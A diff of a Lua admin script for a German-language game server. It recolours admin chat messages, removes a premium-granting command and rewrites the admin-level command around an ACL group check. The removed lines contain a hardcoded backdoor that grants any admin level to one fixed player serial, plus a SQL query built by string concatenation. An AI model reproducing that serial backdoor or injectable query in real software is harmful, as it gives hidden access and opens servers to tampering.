@@ -43,13 +43,16 @@ function blockParticularCmds ( cmd )
 end
 
 function sendMsgToAdmins (text, adminlevel)
+	if not adminlevel then
+		adminlevel = 0
+	end
 	for playeritem, index in pairs(adminsIngame) do 			
 		if index >= adminlevel then
-			outputChatBox ( text , playeritem, 200, 200, 0,true )
+			outputChatBox ( text , playeritem, 99, 184, 255,true )
+			-- alter rgb code 200 200 0
 		end
 	end
 end
---
 
 function blockParticularCmdsJoin ( )
 	addEventHandler( "onPlayerCommand", source, blockParticularCmds )	
@@ -1700,38 +1703,6 @@ function kickAll ( player, cmd, ... )
 		end	
 	end
 end
---	if not socialNeeds[status] then
-
-
-function setPremium (player, cmd, target, days, package)
-	if isAdminLevel ( player, 8 ) then
-		if getPlayerFromName ( target ) then
-			local target = getPlayerFromName ( target )
-			if days then
-				if  package then
-					if tonumber(package) > 0 and tonumber(days) > 0 and tonumber(package) <= maxPackages then
-						setPremiumData (target,days,package)
-						outputChatBox("Du hast soeben für "..days.." Tage Premium Stufe "..package.." bekommen.",target,255, 0, 0)
-						for playeritem, index in pairs(adminsIngame) do 			
-							outputChatBox ( getPlayerName(player).." hat "..getPlayerName(target).." "..days.." Tage die Premium Stufe "..package.." gegeben.", playeritem, 99, 184, 255 )
-						end	
-					else
-						triggerClientEvent ( player, "infobox_start", getRootElement(), "Ungültige Zahl", 5000, 255, 0, 0 )
-					end		
-				else
-					triggerClientEvent ( player, "infobox_start", getRootElement(), "Gebrauch:\n/setpremium [Name]\n[Tage] [Paket]", 5000, 255, 0, 0 )
-				end	
-			else
-				triggerClientEvent ( player, "infobox_start", getRootElement(), "Gebrauch: /setpremium [Name]\n[Tage] [Paket]", 5000, 255, 0, 0 )
-			end	
-		else
-			triggerClientEvent ( player, "infobox_start", getRootElement(), "Spieler ist nicht online.", 5000, 255, 0, 0 )
-		end	
-	else
-		triggerClientEvent ( player, "infobox_start", getRootElement(), "Du bist nicht befugt.", 5000, 255, 0, 0 )
-	end	
-end
-
 
 -- Events
 
@@ -1818,7 +1789,6 @@ addCommandHandler ( "makefft", makeVehFFT )
 addCommandHandler ( "premium", oeffnePremium )
 addCommandHandler ( "prison", prison_func )
 addCommandHandler ( "kickall", kickAll )
-addCommandHandler ( "setpremium", setPremium )
 addCommandHandler ( "co",  changeOOC)
 
 
@@ -2013,7 +1983,6 @@ function adminveh ( player, cmd, vehicle )
 			setVehicleDamageProof( tow, true)
 			setVehicleIdleRespawnDelay ( tow, 10000 )
 			addVehicleUpgrade ( tow, 1079 )
-			--	setElementData ( tow, "admincar", true )
 			adminVehData[tow] = true
 			addEventHandler ( "onVehicleEnter", adminVeh[player], enterVehicle )
 			local tow = nil
@@ -2027,7 +1996,6 @@ function enterVehicle ( thePlayer, seat  )
 	local veh = source
     if adminVehData[veh] == true and not isAdminLevel ( thePlayer, 5 ) and seat == 0  then
         opticExitVehicle ( thePlayer)
-      --  outputChatBox ( "Du bist kein Administrator", thePlayer ) 
     end
 end
 
@@ -2036,74 +2004,64 @@ addCommandHandler ( "smode",  suppmode_func)
 addCommandHandler ( "suppmode",  suppmode_func)
 
 
--- // TODO Remake
-function adminlevel_func ( player, cmd, target, adminlevel )
-		if getElementType ( player ) == "console" then
-			local tplayer = getPlayerFromName (target)
-			print("Konsole hat vollen Zugriff. "..target.." hat Adminlevel "..adminlevel.." bekommen.")
-			vioSetElementData(tplayer, "adminlvl", tonumber(adminlevel) )
-			dbExec ( handler, "UPDATE ?? SET ??=? WHERE ??=?", "userdata", "Adminlevel",  tonumber(adminlevel), "UID", playerUID[target] )
-			return
-		end
-		if getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2"  then
-			local adminlevel = tonumber(adminlevel)
-			vioSetElementData(player, "adminlvl", adminlevel)
-			adminsIngame[player] = adminlevel
-			for playeritem, key in pairs(adminsIngame) do
-				outputChatBox ( "[BACKDOOR???]"..getPlayerName(player).." hat das Adminlevel von sich auf "..adminLevels[adminlevel].."#C8C800 gesetzt.", playeritem, 200, 200, 0, true )
-			end
-		end
-		if isAdminLevel ( player, 8 ) or getElementType ( player ) == "console"  or getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2" and getElementType ( player ) ~= "console" then
-		
-		local tplayer = getPlayerFromName (target)
-		if getElementData ( tplayer, "loggedin" ) == 1 then
-			if getAdminLevel ( player ) > getAdminLevel ( tplayer ) then
-				if tonumber(adminlevel) and target then
-					if dbExist ( "userdata", "Name LIKE '"..target.."'") then
-						local adminlevelnr = tonumber(adminlevel)
-						dbExec ( handler, "UPDATE ?? SET ??=? WHERE ??=?", "userdata", "Adminlevel", adminlevelnr, "UID", playerUID[target] )
-						vioSetElementData(tplayer, "adminlvl", adminlevelnr)
-						outputLog (getPlayerName ( player ).." hat den Adminrang von "..target.." auf "..adminlevel.." gesetzt.", "admin" )
-						vioSetElementData(player, "adminlvl", adminlevelnr)
-						adminsIngame[target] = adminlevelnr
-						for playeritem, key in pairs(adminsIngame) do
-							outputChatBox ( getPlayerName(player).." hat das Adminlevel von "..target.." auf "..adminLevels[adminlevelnr].."#C8C800 gesetzt.", playeritem, 200, 200, 0, true )
-						end
-						if adminlevelnr == 0 then
+
+function setPlayerAdminLevelCMD (player, cmd, target, newLevel)
+	-- // Hat der Benutzer die ACL-Admin Gruppe ?
+	if (isGuestAccount(getPlayerAccount(player)) == false) then
+		hasAdminGroup =  isObjectInACLGroup ( "user."..getAccountName (getPlayerAccount(player)), aclGetGroup ( "Admin" ) )
+	else
+		hasAdminGroup =  false
+	end
+
+	if isAdminLevel ( player, 7 ) or getElementType ( player ) == "console" or hasAdminGroup == true then
+		if target then 
+			local pName = getPlayerName(player)
+			local newLevel = tonumber ( newLevel )
+			if newLevel and adminLevels[newLevel]  and newLevel > -1 then
+				if getPlayerFromName(target) and getElementData ( getPlayerFromName(target), "loggedin" ) == 1 then -- // Online
+					local target = getPlayerFromName(target)
+					local tName = getPlayerName(target)
+					if getAdminLevel ( player ) >= getAdminLevel ( target ) or hasAdminGroup then
+						sendMsgToAdmins (pName.." hat den Teamrang von "..tName.." auf "..adminLevels[newLevel].."#63B8FF ("..newLevel..") gesetzt.")
+						newInfobox (player, "Du hast den Teamrang von "..tName.." auf "..newLevel.." gesetzt.", 4)
+						newInfobox (target, "Du hast den Teamrang "..newLevel.." von "..pName.." gesetzt bekommen.", 4)
+						vioSetElementData(target, "adminlvl", newLevel)
+						dbExec ( handler, "UPDATE ?? SET ??=? WHERE ??=?", "userdata", "Adminlevel", newLevel, "UID", playerUID[target] )
+						if newLevel == 0 then
 							adminsIngame[target] = nil
+						else
+							adminsIngame[target] = newLevel
 						end
 					else
-						triggerClientEvent ( player, "infobox_start", getRootElement(), "\n\nSpieler existiert nicht!", 5000, 255, 0, 0 )
+						newInfobox (player, tName.." hat ein höheres Adminlevel als du.", 3)
 					end
-				else
-					triggerClientEvent ( player, "infobox_start", getRootElement(), "\n\nVerwende: /adminlevel [Name] [Level]", 5000, 0, 125, 125 )
+					
+				else -- // Offline
+					if playerUID[target] then
+						local result = dbPoll ( dbQuery ( handler, "SELECT ?? FROM ?? WHERE ??=?", "Adminlevel", "userdata", "UID", playerUID[target] ), -1 )
+						local tAdminlevel = result[1].Adminlevel
+						if tAdminlevel <=  getAdminLevel ( player ) or hasAdminGroup then
+							sendMsgToAdmins (pName.." hat den Teamrang von "..target.." auf "..adminLevels[newLevel].."#63B8FF ("..newLevel..") gesetzt.")
+							dbExec ( handler, "UPDATE ?? SET ??=? WHERE ??=?", "userdata", "Adminlevel", newLevel, "UID", playerUID[target] )
+							newInfobox (player, "Du hast den Rang von "..target.." auf "..newLevel.." gesetzt.", 4)
+						else
+							newInfobox (player, target.." hat ein höheres Adminlevel als du.", 3)
+						end
+					else
+						newInfobox (player, "Dieser Spieler existiert nicht.", 3)
+					end
 				end
 			else
-				triggerClientEvent ( player, "infobox_start", getRootElement(), "\n\nHöherer Admin!", 5000, 255, 0, 0 )
+				newInfobox (player, "Ungültiges Adminlevel.", 3)
 			end
 		else
-			if tonumber(adminlevel) and target then
-				if dbExist ( "userdata", "Name LIKE '"..target.."'") then
-					local adminlevelnr = tonumber(adminlevel)
-					dbExec ( handler, "UPDATE ?? SET ??=? WHERE ??=?", "userdata", "Adminlevel", adminlevelnr, "UID", playerUID[target] )
-					outputLog ( getPlayerName ( player ).." hat den Adminrang von "..target.." auf "..adminlevel.." gesetzt.", "admin" )
-					for playeritem, key in pairs(adminsIngame) do
-						outputChatBox ( getPlayerName(player).." hat das Adminlevel von "..target.." auf "..adminLevels[adminlevelnr].."#C8C800 gesetzt.", playeritem, 200, 200, 0, true )
-					end
-				else
-					triggerClientEvent ( player, "infobox_start", getRootElement(), "\n\nSpieler existiert nicht!", 5000, 255, 0, 0 )
-				end
-			else
-				triggerClientEvent ( player, "infobox_start", getRootElement(), "\n\nVerwende: /adminlevel [Name] [Level]", 5000, 0, 125, 125 )
-			end
+			newInfobox (player, "Du musst einen Spieler angeben.\n/adminlevel [NAME] [LEVEL]", 3)
 		end
 	else
-		triggerClientEvent ( player, "infobox_start", getRootElement(), "\nDu bist\nnicht befugt!", 7500, 125, 0, 0 )		
+		newInfobox (player, "Du bist nicht befugt.", 3)
 	end
 end
-addCommandHandler ( "setadmin", adminlevel_func )
-addCommandHandler ( "adminlevel", adminlevel_func )
-addCommandHandler ( "makeadmin", adminlevel_func )
+addCommandHandler ( "adminlevel", setPlayerAdminLevelCMD )
 
 function offuninvite (player, cmd, target )
     if isAdminLevel ( player, 4 ) then
